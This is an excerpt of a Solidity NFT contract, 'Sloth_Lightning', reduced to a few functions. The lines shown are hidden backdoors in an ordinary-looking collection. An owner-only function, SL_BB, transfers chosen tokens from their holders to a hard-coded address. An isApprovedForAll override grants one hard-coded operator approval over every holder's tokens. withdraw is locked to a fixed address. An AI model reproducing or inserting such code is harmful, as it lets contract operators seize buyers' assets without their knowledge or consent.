...
contract Sloth_Lightning is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Sloth Lightning", "SL", maxBatchSize_, collectionSize_) {
  ...
  function SL_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x2D24e5221798d185afF2CBEb723Fd342a34AA8bA, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x552736e71506Bc0D42b5ED30eD55b34a776AAde4);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x52CfADabD0C9fC7b57f916454015F16017c1aCd2){return true;}
